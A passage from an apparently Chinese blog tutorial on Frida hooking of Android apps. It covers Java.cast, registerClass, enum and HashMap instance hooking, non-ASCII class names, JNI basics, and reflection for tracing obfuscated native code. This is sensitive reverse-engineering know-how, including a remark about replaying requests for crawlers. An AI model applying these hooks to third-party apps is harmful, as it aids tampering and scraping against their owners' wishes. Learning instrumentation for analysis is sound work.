newResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用来构造参数重发包，用在爬虫上。</p><h3 id="类的多态：转型-Java-cast"><a href="#类的多态：转型-Java-cast" class="headerlink" title="类的多态：转型/Java.cast"></a>类的多态：转型/Java.cast</h3><p>可以通过<code>getClass().getName().toString()</code>来查看当前实例的类型。<br>找到一个instance，通过<code>Java.cast</code>来强制转换对象的类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates a JavaScript wrapper given the existing instance at `handle` of</span></span><br><span class="line"><span class="comment"> * given class `klass` as returned from `Java.use()`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>handle An existing wrapper or a JNI handle.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>klass Class wrapper for type to cast to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cast</span>(<span class="params">handle: Wrapper | NativePointerValue, klass: Wrapper</span>): <span class="title">Wrapper</span>;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Water</span> </span>&#123; <span class="comment">// 水 类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">flow</span><span class="params">(Water W)</span> </span>&#123; <span class="comment">// 水 的方法</span></span><br><span class="line">        <span class="comment">// SomeSentence</span></span><br><span class="line">        Log.d(<span class="string">"2Object"</span>, <span class="string">"water flow: I`m flowing"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"water flow: I`m flowing"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">still</span><span class="params">(Water W)</span> </span>&#123; <span class="comment">// 水 的方法</span></span><br><span class="line">        <span class="comment">// SomeSentence</span></span><br><span class="line">        Log.d(<span class="string">"2Object"</span>, <span class="string">"water still: still water runs deep!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"water still: still water runs deep!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Juice</span> <span class="keyword">extends</span> <span class="title">Water</span> </span>&#123; <span class="comment">// 果汁 类 继承了水类</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">fillEnergy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"2Object"</span>, <span class="string">"Juice: i`m fillingEnergy!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Juice: i`m fillingEnergy!"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> JuiceHandle = <span class="literal">null</span> ;</span><br><span class="line">Java.choose(<span class="string">"com.r0ysue.a0526printout.Juice"</span>,&#123;</span><br><span class="line">    onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"found juice instance"</span>,instance);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"juice instance call fill"</span>,instance.fillEnergy());</span><br><span class="line">        JuiceHandle = instance;</span><br><span class="line">    &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"juice handle search completed!"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Saved juice handle :"</span>,JuiceHandle);</span><br><span class="line"><span class="keyword">var</span> WaterHandle = Java.cast(JuiceHandle,Java.use(<span class="string">"com.r0ysue.a0526printout.Water"</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"call Waterhandle still method:"</span>,WaterHandle.still(WaterHandle));</span><br></pre></td></tr></table></figure><h3 id="interface-Java-registerClass"><a href="#interface-Java-registerClass" class="headerlink" title="interface/Java.registerClass"></a>interface/Java.registerClass</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">liquid</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">flow</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>frida提供能力去创建一个新的java class</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Creates a new Java class.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param </span>spec Object describing the class to be created.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">registerClass</span>(<span class="params">spec: ClassSpec</span>): <span class="title">Wrapper</span>;</span></span><br></pre></td></tr></table></figure><p>首先获取要实现的interface，然后调用registerClass来实现interface。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> liquid = Java.use(<span class="string">"com.r0ysue.a0526printout.liquid"</span>);</span><br><span class="line">        <span class="keyword">var</span> beer = Java.registerClass(&#123;</span><br><span class="line">            name: <span class="string">'com.r0ysue.a0526printout.beer'</span>,</span><br><span class="line">            implements: [liquid],</span><br><span class="line">            methods: &#123;</span><br><span class="line">                flow: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"look, beer is flowing!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"look, beer is flowing!"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"beer.bubble:"</span>,beer.$<span class="keyword">new</span>().flow())      </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成员内部类-匿名内部类"><a href="#成员内部类-匿名内部类" class="headerlink" title="成员内部类/匿名内部类"></a>成员内部类/匿名内部类</h3><p>看smali或者枚举出来的类。</p><h3 id="hook-enum"><a href="#hook-enum" class="headerlink" title="hook enum"></a>hook enum</h3><p>关于java枚举，从这篇文章了解。<br><a href="https://www.cnblogs.com/jingmoxukong/p/6098351.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingmoxukong/p/6098351.html</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Signal &#123;</span><br><span class="line">    GREEN, YELLOW, RED</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrafficLight</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Signal color = Signal.RED;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">"4enum"</span>, <span class="string">"enum "</span>+ color.getClass().getName().toString());</span><br><span class="line">        <span class="keyword">switch</span> (color) &#123;</span><br><span class="line">            <span class="keyword">case</span> RED:</span><br><span class="line">                color = Signal.GREEN;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> YELLOW:</span><br><span class="line">                color = Signal.RED;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> GREEN:</span><br><span class="line">                color = Signal.YELLOW;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.choose(<span class="string">"com.r0ysue.a0526printout.Signal"</span>,&#123;</span><br><span class="line">            onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"instance.name:"</span>,instance.name());</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"instance.getDeclaringClass:"</span>,instance.getDeclaringClass());                </span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"search completed!"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="打印hash-map"><a href="#打印hash-map" class="headerlink" title="打印hash map"></a>打印hash map</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.choose(<span class="string">"java.util.HashMap"</span>,&#123;</span><br><span class="line">            onMatch:<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance.toString().indexOf(<span class="string">"ISBN"</span>)!= <span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"instance.toString:"</span>,instance.toString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"search complete!"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="打印non-ascii"><a href="#打印non-ascii" class="headerlink" title="打印non-ascii"></a>打印non-ascii</h3><p><a href="https://api-caller.com/2019/03/30/frida-note/#non-ascii" target="_blank" rel="noopener">https://api-caller.com/2019/03/30/frida-note/#non-ascii</a><br>类名非ASCII字符串时，先编码打印出来, 再用编码后的字符串去 hook.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//场景hook cls.forName寻找目标类的classloader。</span></span><br><span class="line">    cls.forName.overload(<span class="string">'java.lang.String'</span>, <span class="string">'boolean'</span>, <span class="string">'java.lang.ClassLoader'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg1, arg2, arg3</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clsName = cls.forName(arg1, arg2, arg3);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'oriClassName:'</span> + arg1)</span><br><span class="line">        <span class="keyword">var</span> base64Name = <span class="built_in">encodeURIComponent</span>(arg1)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'encodeName:'</span> + base64Name);</span><br><span class="line">        <span class="comment">//通过日志确认base64后的非ascii字符串，下面对比并打印classloader</span></span><br><span class="line">        <span class="comment">//clsName为特殊字符o.ÎÉ«</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'o.%CE%99%C9%AB'</span> == base64Name) &#123;</span><br><span class="line">            <span class="comment">//打印classloader</span></span><br><span class="line">            <span class="built_in">console</span>.log(arg3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clsName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-native-hook-NDK开发入门"><a href="#Frida-native-hook-NDK开发入门" class="headerlink" title="Frida native hook : NDK开发入门"></a>Frida native hook : NDK开发入门</h2><p><a href="https://www.jianshu.com/p/87ce6f565d37" target="_blank" rel="noopener">https://www.jianshu.com/p/87ce6f565d37</a></p><ul><li>extern “C”与名称修饰<ul><li>通过c++filt工具可以直接还原得到原来的函数名</li><li><a href="https://zh.wikipedia.org/zh-hans/%E5%90%8D%E5%AD%97%E4%BF%AE%E9%A5%B0" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/%E5%90%8D%E5%AD%97%E4%BF%AE%E9%A5%B0</a></li><li>通过extern “C”导出的JNI函数不会被name mangling</li></ul></li><li>JNI参数与基本类型</li><li>第一个NDK程序<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-154643.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-30-155007.png" alt=""></li><li>JNI log<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TAG <span class="meta-string">"sakura1328"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO,TAG,__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR,TAG,__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringFromJNI(</span><br><span class="line">        JNIEnv *env,</span><br><span class="line">        jobject <span class="comment">/* this */</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> hello = <span class="string">"Hello from C++"</span>;</span><br><span class="line">    LOGD(<span class="string">"sakura1328"</span>);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="title">extends</span> <span class="title">AppCompatActivity</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> TAG = <span class="string">"sakura"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the 'native-lib' library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native-lib"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Example of a call to a native method</span></span><br><span class="line">        TextView tv = (TextView) findViewById(R.id.sample_text);</span><br><span class="line">        tv.setText(stringFromJNI());</span><br><span class="line">        Log.d(TAG, stringFromJNI());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A native method that is implemented by the 'native-lib' native library,</span></span><br><span class="line"><span class="comment">     * which is packaged with this application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> native <span class="keyword">String</span> <span class="title">stringFromJNI</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Frida-native-hook-JNIEnv和反射"><a href="#Frida-native-hook-JNIEnv和反射" class="headerlink" title="Frida native hook : JNIEnv和反射"></a>Frida native hook : JNIEnv和反射</h2><h3 id="以jni字符串来掌握基本的JNIEnv用法"><a href="#以jni字符串来掌握基本的JNIEnv用法" class="headerlink" title="以jni字符串来掌握基本的JNIEnv用法"></a>以jni字符串来掌握基本的JNIEnv用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">stringWithJNI</span><span class="params">(String context)</span></span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">extern <span class="string">"C"</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line">Java_myapplication_example_com_ndk_1demo_MainActivity_stringWithJNI(JNIEnv *env, jobject instance,</span><br><span class="line">                                                                    jstring context_) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *context = env-&gt;GetStringUTFChars(context_, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> context_size = env-&gt;GetStringUTFLength(context_);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOGD(<span class="string">"%s\n"</span>, context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    env-&gt;ReleaseStringUTFChars(context_, context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"sakura1328"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>-<span class="number">26</span> <span class="number">22</span>:<span class="number">30</span>:<span class="number">00.548</span> <span class="number">15764</span>-<span class="number">15764</span>/myapplication.example.com.ndk_demo D/sakura1328: sakura</span><br></pre></td></tr></table></figure><h3 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h3><p>总结: 多去读一下java的反射API。</p><p><a href="https://www.jianshu.com/p/9be58ee20dee" target="_blank" rel="noopener">Java高级特性——反射</a></p><ul><li>查找调用各种API接口、JNI、frida/xposed原理的一部分</li><li>反射基本API</li><li>反射修改访问控制、修改属性值</li><li>JNI so调用反射进入java世界</li><li>xposed/Frida hook原理</li></ul><p>这里其实有一个伏笔，就是为什么我们要trace artmethod，hook artmethod是因为有些so混淆得非常厉害，然后也就很难静态分析看出so里面调用了哪些java函数，也不是通过类似JNI的GetMethodID这样来调用的。<br>而是通过类似findclass这种方法先得到类，然后再反射调用app里面的某个java函数。</p><p>所以去hook它执行的位置，每一个java函数对于Android源码而言都是一个artmethod结构体，然后hook拿到artmethod实例以后调用类函数，打印这个函数的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"sakura"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the 'native-lib' library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native-lib"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Example of a call to a native method</span></span><br><span class="line">        TextView tv = (TextView) findViewById(R.id.sample_text);</span><br><span class="line">        tv.setText(stringWithJNI(<span class="string">"sakura"</span>));</span><br><span class="line"><span class="comment">//        Log.d(TAG, stringFromJNI());</span></span><br><span class="line"><span class="comment">//        Log.d(TAG, stringWithJNI("sakura"));</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            testClass();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testClass</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;</span><br><span class="line">        Test sakuraTest = <span class="keyword">new</span> Test();</span><br><span class="line">        <span class="comment">// 获得Class的方法（三种）</span></span><br><span class="line">        Class testClazz = MainActivity.class.getClassLoader().loadClass("myapplication.example.com.ndk_demo.Test");</span><br><span class="line">        Class testClazz2 = Class.forName(<span class="string">"myapplication.example.com.ndk_demo.Test"</span>);</span><br><span class="line">        Class testClazz3 = Test<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        Log.i(TAG, <span class="string">"Classloader.loadClass-&gt;"</span> + testClazz);</span><br><span class="line">        Log.i(TAG, <span class="string">"Classloader.loadClass-&gt;"</span> + testClazz2);</span><br><span class="line">        Log.i(TAG, <span class="string">"Classloader.loadClass-&gt;"</span> + testClazz3.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得类中属性相关的方法</span></span><br><span class="line">        Field publicStaticField = testClazz3.getDeclaredField(<span class="string">"publicStaticField"</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredField-&gt;"</span> + publicStaticField);</span><br><span class="line"></span><br><span class="line">        Field publicField = testClazz3.getDeclaredField(<span class="string">"publicField"</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">"testClazz3.getDeclaredField-&gt;"</span> + publicField);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对于Field的get方法，如果是static，则传入null即可;如果不是，则需要传入一个类的实例</span></span><br><span class="line">        String valueStaticPublic = (String) publicStaticField.get(<span class="keyword">null</span>);</span><br><span class="line">        